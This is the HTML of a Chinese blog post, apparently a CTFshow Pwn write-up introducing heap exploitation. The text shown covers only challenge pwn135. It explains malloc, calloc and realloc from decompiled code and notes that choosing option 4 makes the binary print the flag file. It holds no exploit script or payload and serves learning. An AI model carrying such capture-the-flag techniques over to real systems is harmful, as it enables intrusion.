@@ -1,0 +1,1124 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fufu.png">
+  <link rel="icon" href="/img/fufu.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Meiyouqian">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Bypass好多都和具体的版本有关，很多限制很大，现在也可能用不了了，所以还是先把堆学起来吧 pwn135  135-140是演示题目阶段，好好理解吧，我还是觉得栈到堆跨度有点大，比0基础到学会栈溢出的跨度还大 保护：       上来是做选择题，其实是为了给我们演示一下这几个函数的作用，让我们好好了解一下   靠输入v1在区分，我们就按照v1的大小来分析吧 首先是v1&#x3D;1，malloc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow-Pwn入门堆利用-前置基础(135-141)">
+<meta property="og:url" content="https://mei-you-qian.github.io/2026/04/10/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="玫幽倩的小博客">
+<meta property="og:description" content="Bypass好多都和具体的版本有关，很多限制很大，现在也可能用不了了，所以还是先把堆学起来吧 pwn135  135-140是演示题目阶段，好好理解吧，我还是觉得栈到堆跨度有点大，比0基础到学会栈溢出的跨度还大 保护：       上来是做选择题，其实是为了给我们演示一下这几个函数的作用，让我们好好了解一下   靠输入v1在区分，我们就按照v1的大小来分析吧 首先是v1&#x3D;1，malloc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775573582479-8f7871b4-2d8d-4d23-85cb-83a6cfc1846d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574074016-535b1b54-82aa-4137-8ecf-76d3bbf993e5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574154716-af4add4a-7883-412e-be1f-7c54b4b56fe7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574139442-60304a80-d299-439f-ae4b-32c30c435200.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574308992-8689dd6b-364e-424a-8fd8-3b8d7e7c0b90.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574210137-d245b155-8b98-4a1c-a174-2b90bf9f0f4b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775575634400-608624c6-fe8a-4c09-b0d9-43b1b148728d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775635692870-dd12c84b-b3f1-4fbd-8c53-d0bc9db7b2c8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775635713870-7c332b67-e60c-4d6a-9fb3-64a187df0390.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775636081438-a6191597-ca77-4f80-b4fb-3f7f991d8234.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775636876639-23e3206f-8c8d-467f-9860-12fa5f09a18d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775636891199-bf3f0c78-9ac7-4596-bc48-7c927b1a8e9f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775637124445-ed7938de-f3b2-48b8-bf91-1c90ed66dbfc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775652365458-4c53009b-0b45-44bc-8793-f8074fb4e7ac.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654340744-ec4d58f0-cc6f-4e9e-aa4a-910984c64dcd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654510410-7b394ff7-aba4-4a67-a468-e1dc734f4d55.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654649725-0a46414d-b210-42cd-bf03-d5ce4495c1ef.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654674759-fb232bd5-15c3-4eee-9821-cc79c99f9004.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775658780381-d478661f-a7e0-4b5e-8130-81a20f4f50f6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775659318664-7be3cc5d-bbe0-451a-8f5f-1caafc2505f8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775659570227-d0fc04bf-5529-4237-b6c4-ce8c84d79f68.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775660361971-335b0637-336d-49d5-b361-6a015c12db02.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775660401418-c31afa52-6a06-411f-b34d-2e5abb974a23.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775660932165-9a46bd2f-5b31-4dd3-90e1-a5e543a0aaf9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661465725-66499aac-21ef-4ad5-b449-2645f1da2f04.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661574618-b55287fc-a295-44c2-a8c6-d6807fd91aad.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661596521-4d1a43bd-bf4d-42ec-b964-1085b6299c74.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661642720-a2a3f0e7-1cbb-4f74-bd0d-503962dc6d4a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661679976-ce594f57-16f8-4939-9b21-d06f7ddf6f98.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662510311-4607230f-3c82-452e-b359-0b847a86e746.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662542322-94bdba1d-087c-4ad6-850c-2b3029943fd7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662610172-a005bb31-abc5-4bf8-b84d-d5e78d599afd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775663166928-3f149508-6de1-4e5b-9ace-7b6ba34945bb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662805877-09c98cb6-dd4c-4938-a10f-e679609b8560.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775663418326-aa639bb2-b50c-45e7-b11c-a20c4983a520.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775663581867-97799586-2eac-4a98-bc15-63a8f3dd4496.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775694927905-a8f09e3b-4435-4f43-a8f1-35e980dc0b80.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775694961987-a3b226da-977f-4ce6-b629-d26c6bfef2d1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775695710741-068ea546-edb4-4add-a4ef-58fef4ae4c81.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775695729162-c46c6e47-953c-41d0-a6e1-398a3d1c84bc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775695794603-3baeecc3-d27b-4e49-ba69-cc813f314d40.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775696619259-695532b1-d88f-4a65-b316-6163db12ed62.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775696701713-27abbb1f-5865-433f-a11c-d84a716a6132.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775697577795-8bff7c3d-dcec-4d47-83fc-3170382c897e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775697695562-56af87b0-36f8-4efb-bfca-69a12b6ab388.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775699854808-ac4e6709-258f-4ed8-8703-61b2c1c94b23.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775699841238-63f5b103-3466-49e5-874f-c364bf261d64.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775699896036-e70e7a76-1837-4147-89eb-619b9686edc8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700725735-081fc90c-703c-4d9e-866b-fdaa32c5f8d7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700738249-ddadcff0-8f5f-4ce0-94b9-9fe1289a0090.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700794877-bda6f149-2e88-4f66-9f6d-35316ecb2d63.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700830745-ded465aa-6c3a-4732-a57c-b8a7dd6ee9cd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775702208808-7ba69c49-a72a-4d85-8d7d-366748716f5b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775702436837-90788793-726f-48f8-ad2f-77ce6e7698d2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775702425864-bf2cd448-9a0e-421a-9373-049d1ab67e7f.png">
+<meta property="article:published_time" content="2026-04-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-10T00:54:32.259Z">
+<meta property="article:author" content="Meiyouqian">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mei-you-qian.github.io/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775573582479-8f7871b4-2d8d-4d23-85cb-83a6cfc1846d.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CTFshow-Pwn入门堆利用-前置基础(135-141) - 玫幽倩的小博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/mk.css">
+<link rel="stylesheet" href="/css/selection.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mei-you-qian.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>玫幽倩</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/beijing.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTFshow-Pwn入门堆利用-前置基础(135-141)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-10 00:00" pubdate>
+          2026年4月10日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTFshow-Pwn入门堆利用-前置基础(135-141)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Bypass好多都和具体的版本有关，很多限制很大，现在也可能用不了了，所以还是先把堆学起来吧</p>
+<h2 id="pwn135"><a href="#pwn135" class="headerlink" title="pwn135"></a>pwn135</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775573582479-8f7871b4-2d8d-4d23-85cb-83a6cfc1846d.png" srcset="/img/loading.gif" lazyload></p>
+<p>135-140是演示题目阶段，好好理解吧，我还是觉得栈到堆跨度有点大，比0基础到学会栈溢出的跨度还大</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574074016-535b1b54-82aa-4137-8ecf-76d3bbf993e5.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574154716-af4add4a-7883-412e-be1f-7c54b4b56fe7.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574139442-60304a80-d299-439f-ae4b-32c30c435200.png" srcset="/img/loading.gif" lazyload></p>
+<p>上来是做选择题，其实是为了给我们演示一下这几个函数的作用，让我们好好了解一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574308992-8689dd6b-364e-424a-8fd8-3b8d7e7c0b90.png" srcset="/img/loading.gif" lazyload></p>
+<p>靠输入v1在区分，我们就按照v1的大小来分析吧</p>
+<p>首先是v1&#x3D;1，malloc</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">printf(&quot;Enter the size to allocate using malloc: &quot;);<br><span class="hljs-strong">__isoc99<span class="hljs-emphasis">_scanf(&quot;%lu&quot;, &amp;size);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">ptr = malloc(size);</span></span><br></code></pre></td></tr></table></figure>
+
+<p>输入1之后会问我们需要多少size来用malloc，我们输入一个无符号长整形之后就开始ptr&#x3D;malloc(size)了</p>
+<p>这是一个内存分配函数，size就是要分配的字节数，ptr在这边是一个指针变量，主要是接受分配内存的起始地址</p>
+<p>注意这个是动态分配的，程序运行的时候决定大小，内存不足的时候会返回NULL，最关键的是这边必须手动free(ptr)释放，否则会引发内存泄露</p>
+<p>接下来是v1 &#x3D; 2，也就是calloc</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">printf(&quot;Enter the size to allocate using calloc: &quot;);<br><span class="hljs-strong">__isoc99<span class="hljs-emphasis">_scanf(&quot;%lu&quot;, &amp;size);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">ptr = calloc(1uLL, size);</span></span><br></code></pre></td></tr></table></figure>
+
+<p>相对来说其实差不多，但是calloc接受的是两个参数</p>
+<p>第一个参数表示要分配的元素数量，这里是一个元素</p>
+<p>第二个参数表示每个元素的大小(字节数)，需要从用户输入获取</p>
+<p>和malloc主要是区别在于一个是参数数量不一样，另一个是calloc的内存初始化是会自动清零的，而malloc是随机值，分配总量也不一样，calloc分配的是num*size字节，而malloc是size字节</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">printf(&quot;Enter the size to allocate using realloc: &quot;);<br><span class="hljs-strong">__isoc99<span class="hljs-emphasis">_scanf(&quot;%lu&quot;, &amp;size);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">ptr = realloc(ptr, size);</span></span><br></code></pre></td></tr></table></figure>
+
+<p>最后是realloc，可以看到也是俩参数，这个函数明显比前边俩复杂不少</p>
+<p>首先，这是一个用于重新分配内存的重要函数，第一个参数是指向之前分配的内存块的指针，而第二个参数是新的内存块的大小（字节数）</p>
+<p>成功的返回值就是指向重新分配内存的指针，失败了就返回NULL，然后原来的内存块不变</p>
+<p>主要有三种情况</p>
+<p>起义是缩小内存</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">// 原始分配100字节<br>ptr = malloc(100);<br>// 缩小到50字节<br>ptr = realloc(ptr, 50);<br></code></pre></td></tr></table></figure>
+
+<p>一般是原地缩小，保留前边的内容</p>
+<p>第二是扩大内存(原地)</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ptr = malloc(100);<br>ptr = realloc(ptr, 150);<br></code></pre></td></tr></table></figure>
+
+<p>同样原地，指针不变</p>
+<p>最后是扩大内存(迁移)</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ptr = malloc(100);<br>ptr = realloc(ptr, 10000);<br></code></pre></td></tr></table></figure>
+
+<p>如果后续空间不够的话，会分配到新的大内存块，然后复制原数据到新数据，释放原内存块后返回新地址</p>
+<p>注意如果一开始ptr就有内存块，然后在原地又去realloc还失败了的话，原来的指针会被覆盖为NULL，也就是说一开始的内存块在，但现在没有任何指针指向它，也无法访问，无法释放，这也叫内存泄露</p>
+<p>大概就这样子了解了一下三个函数的概念，flag很好找的</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">if ( v1 == 4 )<br><span class="hljs-code">      &#123;</span><br><span class="hljs-code">        printf(&quot;Here is you want: &quot;);</span><br><span class="hljs-code">        system(&quot;cat /ctfshow_flag&quot;);</span><br><span class="hljs-code">      &#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>直接输入4就是了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775574210137-d245b155-8b98-4a1c-a174-2b90bf9f0f4b.png" srcset="/img/loading.gif" lazyload></p>
